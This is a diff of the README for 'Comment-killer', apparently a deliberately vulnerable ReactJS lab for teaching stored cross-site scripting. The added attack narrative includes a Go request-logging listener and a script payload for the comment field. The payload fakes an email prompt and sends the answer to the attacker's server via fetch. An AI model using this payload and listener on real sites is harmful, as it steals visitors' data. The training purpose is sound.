@@ -1,17 +1,19 @@
 # Comment-killer
 
-<img src="image/img1.png" alt="img1.png"/>
+<p align="center">
+    <img src="images/img1.png"/>
+</p>
 
-Comment-killer is a simple ReactJS app, which has Cross-Site Scripting vulnerability and its main goal is to describe how a malicious user could exploit them on this purposefully vulnerable app.
+Comment-killer is a simple ReactJS app, which has Cross-Site Scripting vulnerability and its main goal is to describe how a malicious user could exploit it on this purposefully vulnerable app.
 
 # Index
 
-1. [ Definition ](#Def)
-2. [ Setup ](#Set)
-3. [ Attack narrative ](#Att)
-4. [ Objectives ](#Obj)
-5. [ Solutions ](#Sol)
-6. [ Contributing ](#Cont)
+- [Definition](#what-is-cross-site-scripting)
+- [Setup](#setup)
+- [Attack narrative](#attack-narrative)
+- [Objectives](#secure-this-app)
+- [Solutions](#pr-solutions)
+- [Contributing](#contributing)
 
 <a name="Def"></a>
 
@@ -29,67 +31,109 @@ To start this intentionally **insecure application**, you will need [Docker](htt
 
 ```bash
 cd secDevLabs/owasp-top10-2017-apps/a7/comment-killer
-docker-compose up -d --build
 ```
-
-Then simply visit [http://localhost:10007/](http://localhost:10007/) ! 😆
-
-In order to stop the app-
 
 ```bash
-docker-compose stop
+make install
 ```
+
+Then simply visit [http://localhost:10007](http://localhost:10007) ! 😆
 
 ## Get to know the app 👾
 
 To properly understand how this application works, you can follow these simple steps:
 
--   Comment in a post.
--   Complete the levels.
-
-If you want to reset the app then reload the page.
-
-<a name="Att"></a>
+- Read the cool history behind the Memes.
+- Add a new comment post.
 
 ## Attack narrative
 
 Now that you know the purpose of this app, what could go wrong? The following section describes how an attacker could identify and eventually find sensitive information about the app or its users. We encourage you to follow these steps and try to reproduce them on your own to better understand the attack vector! 😜
 
-Note: This attack narrative works best in Mozilla Firefox.
+### Note: This attack narrative works best in Mozilla Firefox.
 
-👀
+### 👀
 
-Non-sanitization of user input allows for cross-site scripting
+### Non-sanitization of user input allows for cross-site scripting
 
-After inspecting the application, it is possible to identify that some entries are not sanitized and can be executed on a web browser. It occurs in search, comment, and post fields. The following images show this behavior when the following text is used as an input on these fields:
+After inspecting the application, it is possible to identify that the comment entry is not sanitized and can be executed on a web browser. The following images show this behavior when the following text is used as an input on these fields:
 
-Type- `<script>alert(1)</script>` in the comment box and comment it. You will see this-
+```
+<script>alert(1)</script>
+```
 
-<img src="image/img2.png" alt="img2.png">
+Adding a new comment to a post:
+<p align="center">
+    <img src="images/img2.png"/>
+</p>
 
-This website has interpreted your comment as a block of code, and stored it in it's server. Hence, whenever the comment section loads on anybody's machine, this block of code will be executed!
+The missing input validation allows a malicious user to insert some scripts that will persist in the server and be executed on the victims' browser every time they access the routes that contain these scripts.
 
-🔥
+#### 🔥
 
-### Level1
+An attacker may abuse this flaw by generating a malicious JS code and sending it to other users. To demonstrate this, the following example will create an email form to try and steal user credentials.
 
-Make the page alert this message- "Hello! You have completed level1 !" by calling a function which has already been defined.(Hint: You have to use the inspector tool!(Right-click and choose Inspect))
+Initially, an API is needed to log all received requests and can be built in Golang as follows:
 
-<img src="image/img3.png" alt="img3.png">
+```go
+package main
 
-### Level2
+import (
+   "fmt"
+   "github.com/labstack/echo"
+)
 
-Get the author's password!
+func main() {
+   e := echo.New()
+   e.GET("/:email", handler)
+   e.Logger.Fatal(e.Start(":9051"))
+}
 
-<img src="image/img4.png" alt="img4.png">
+func handler(c echo.Context) error {
+   fmt.Println(c.Request().RemoteAddr, c.Param("email"))
+   return nil
+}
+```
 
-### Level3
+In order to start the API, the following command can be used (you should check this [guide](https://golang.org/doc/install) if you need any help with Golang):
 
-Change the content of the blog post!
+```sh
+go run main.go
+```
 
-<img src="image/img5.png" alt="img5.png">
+With the API now up and running, all that is needed is the following code to show a pop-up message requesting the user's email in order to continue reading the blog:
 
-<a name="Obj"></a>
+```js
+<script>
+    var email = prompt("Please input your email again to continue:", "email@example.com");
+
+    if (email == null || email == "") {
+        alert("Ooops, please refresh the page!");
+    } else {
+        fetch('http://localhost:9051/'+email);
+    }
+</script>
+```
+
+The above JavaScript code is responsible for sending a `GET` request to the attacker's API so it can be logged. In this scenario, we'll be sending requests to `localhost`.
+
+All we need now is to paste the JavaScript code in the comments field, as shown by the following image:
+
+<p align="center">
+    <img src="images/img3.png"/>
+</p>
+
+When another user access the app, the following pop-up will be shown, as we can see in the image below:
+
+<p align="center">
+    <img src="images/img4.png"/>
+</p>
+
+Meanwhile, with the API up and running, we're able to receive the user's email, as shown by the next image:
+
+<p align="center">
+    <img src="images/img5.png"/>
+</p>
 
 ## Secure this app
 
